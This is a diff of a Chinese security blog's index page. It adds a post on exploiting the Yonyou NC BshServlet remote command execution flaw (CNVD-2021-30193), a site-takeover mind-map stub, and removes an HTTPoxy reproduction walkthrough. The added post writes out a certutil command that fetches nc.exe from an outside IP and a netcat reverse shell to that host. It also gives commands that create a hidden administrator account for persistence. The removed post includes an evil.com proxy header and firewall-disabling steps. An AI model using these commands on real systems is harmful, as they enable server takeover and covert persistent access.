@@ -227,6 +227,181 @@
             
 
   
+    <article id="post-CNVD-2021-30193 " class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/06/09/CNVD-2021-30193%20/">从命令执行到getshell</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/06/09/CNVD-2021-30193%20/" class="archive-article-date">
+        <time datetime="2021-06-09T07:22:19.665Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="CNVD-2021-30193-从命令执行到getshell"><a href="#CNVD-2021-30193-从命令执行到getshell" class="headerlink" title="CNVD-2021-30193 从命令执行到getshell"></a>CNVD-2021-30193 从命令执行到getshell</h2><h3 id="漏洞简介：用友-NC-bsh-servlet-BshServlet-远程命令执行漏洞"><a href="#漏洞简介：用友-NC-bsh-servlet-BshServlet-远程命令执行漏洞" class="headerlink" title="漏洞简介：用友 NC bsh.servlet.BshServlet 远程命令执行漏洞"></a>漏洞简介：<strong>用友 NC bsh.servlet.BshServlet 远程命令执行漏洞</strong></h3><p>用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609160221270.png" alt="image-20210609160221270"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先考虑反弹一个稳定的shell。目标主机是Win2012这里选择使用nc,但是目标主机上没有，所以需要先下载下来。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://198.xx.xx.xx/nc.exe d:\\xxh.exe</span><br></pre></td></tr></table></figure>
+
+<p>服务端开启监听之后再执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d:\\xxh.exe 198.xx.xx.xxx 1988 -e c:\\windows\\system32\\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>可以看到，目标机已经建立起连接。</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609162551767.png" alt="image-20210609162551767"></p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609164234717.png" alt="image-20210609164234717"></p>
+<h4 id="持续控制"><a href="#持续控制" class="headerlink" title="持续控制"></a>持续控制</h4><p>现在已经得到一个稳定的shell，并且是管理员权限。因此接下来就只需要持久控制进行权限的维持。这里选择使用<strong>Windows系统隐藏账户</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user kriller$ kriller /add</span><br><span class="line">net localgroup administrators kriller$ /add</span><br></pre></td></tr></table></figure>
+
+<p>接着修改注册表，删除用户，再导入用户信息到注册表。这样该隐藏账户的隐蔽性更高。具体步骤请参考：<a target="_blank" rel="noopener" href="https://whoamianony.top/2020/10/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/">链接</a></p>
+    
+    <a class="article-more-a" href="/2021/06/09/CNVD-2021-30193%20/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/09/CNVD-2021-30193%20/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-拿站思维导图" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="拿站思维导图"><a href="#拿站思维导图" class="headerlink" title="拿站思维导图"></a>拿站思维导图</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
+<li><p>WHOIS查询（站长之家）</p>
+</li>
+<li><p>定位真实IP（绕<a target="_blank" rel="noopener" href="http://www.0xby.com/2935.html">cdn</a>、云waf）</p>
+</li>
+</ol>
+<ul>
+<li>​    DNS<a target="_blank" rel="noopener" href="https://securitytrails.com/domain/cd-hjgc.com/dns">历史解析</a></li>
+<li>​    查找子域名(Ksubdomain)</li>
+<li>​    网站邮件头信息</li>
+<li></li>
+</ul>
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3>
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/07/%E6%8B%BF%E7%AB%99%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-安卓开发" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -912,247 +1087,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2021/02/16/Vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-cant-imagine" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/02/16/cant-imagine/">can&#39;t imagine</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/02/16/cant-imagine/" class="archive-article-date">
-        <time datetime="2021-02-16T11:56:08.909Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-16</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210216154203773.png" alt="image-20210216154203773"></p>
-    
-    <a class="article-more-a" href="/2021/02/16/cant-imagine/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/02/16/cant-imagine/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-复现HTTPoxy漏洞（CVE-2016-5385）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/02/15/%E5%A4%8D%E7%8E%B0HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89/">复现HTTPoxy漏洞（CVE-2016-5385）</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/02/15/%E5%A4%8D%E7%8E%B0HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89/" class="archive-article-date">
-        <time datetime="2021-02-15T09:45:47.808Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-15</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p>
-<p>参考链接：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/README.zh-cn.md</a></li>
-</ul>
-<p>为什么还要写这篇文章呢，因为网上许多关于这个漏洞的复现过程要不就照搬原作的(参考连接)要不就写的很含糊。自己在复现过程中也踩过一些坑，所以一起和大家分享下。复现日期-2021-02-15</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
-<li>使用docker一键搭建漏洞环境</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215175754078.png" alt="image-20210215175754078"></p>
-<p>部署成功后，访问index.php页面。抓包看到请求包如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215232704278.png" alt="image-20210215232704278"></p>
-<p>没有任何问题。接着按照笔者所说，加上proxy字段的值，观察返回的结果：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215232856761.png" alt="image-20210215232856761"></p>
-<p>在代理服务器上抓取到的流量包如下:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215233016843.png" alt="image-20210215233016843"></p>
-<p>懒得码了，直接说复现步骤吧。</p>
-<h3 id="Step"><a href="#Step" class="headerlink" title="Step:"></a>Step:</h3><p>其实原理很简单。只需要你有一台稳定的http代理服务器。有很多朋友最终没有复现成功的原因都是卡在了这一步。这里和大家分享一下我的搭建步骤，仅供参考：</p>
-<p>首先我用的是centos7 64位的vps。使用的代理工具是tinyproxy 轻量级代理工具。最终用来查看代理端口流量包的工具是tcpdump。一步一步来，力求没有差错：</p>
-<ul>
-<li>安装tinyproxy</li>
-</ul>
-<p>centos下是可以一键安装的，但是需要注意如果提示说软件包中找不到tinyproxy，需要使用如下命令启用Extras 仓库：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">CentOS and Red Hat Enterprise Linux 7.x</span></span><br><span class="line">wget https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line">sudo rpm -Uvh epel-release-latest-7*.rpm</span><br></pre></td></tr></table></figure>
-
-<p>接着安装tinyproxy:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y tinyproxy</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>配置tinyproxy</li>
-</ul>
-<p>要复现这个漏洞需要我们设置代理服务器为所有人可以访问，具体需要配置的事项如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/tinyproxy/tinyproxy.conf</span><br><span class="line">Port 8888 #更改默认端口</span><br><span class="line"><span class="meta">#</span><span class="bash">Allow 127.0.0.1  注释掉这行 表示允许所有host访问</span></span><br><span class="line">DisableViaHeader Yes #见闻之一</span><br></pre></td></tr></table></figure>
-
-<p>接着关闭放火墙-&gt;设置端口访问-&gt;禁止防火墙自动重启</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br><span class="line">iptables -A INPUT -p tcp --dport 8888 -j ACCEPT</span><br><span class="line">systemctl disable firewalld.service </span><br></pre></td></tr></table></figure>
-
-<p>接着启动代理服务-&gt;测试代理是否成功</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start tinyproxy.service </span><br><span class="line">curl -x 155.138.xxx.xxx:7777 --connect-timeout 5 http://baidu.com#ip和端口改成你自己设置的</span><br></pre></td></tr></table></figure>
-
-<p>如果出现如下界面说明代理服务运行正常：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215234817367.png" alt="image-20210215234817367"></p>
-<ul>
-<li>安装tcpdump</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install tcpdump</span><br></pre></td></tr></table></figure>
-
-<p>接下来需要抓取代理服务器流经该端口的流量：这里演示一下使用tcpdump抓取主机上某网卡上的get、post请求：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 0 -A -vv &#x27;tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>然后在发送到服务器请求包中加上proxy : <a href="http://xxx.xxx.xxx.xxx:port/">http://xxx.xxx.xxx.xxx:port/</a> </p>
-<p>接着你就能在代理服务上看到抓到的流量包了。现在在回过头理解一下这个漏洞，是不是有更加清晰的认识了呢。</p>
-<p>想进一步了解这个漏洞的原理、危害、请<a target="_blank" rel="noopener" href="https://www.laruence.com/2016/07/19/3101.html">移步</a>：</p>
-    
-    <a class="article-more-a" href="/2021/02/15/%E5%A4%8D%E7%8E%B0HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/02/15/%E5%A4%8D%E7%8E%B0HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89/">展开全文 >></a>
     </p>
     
 
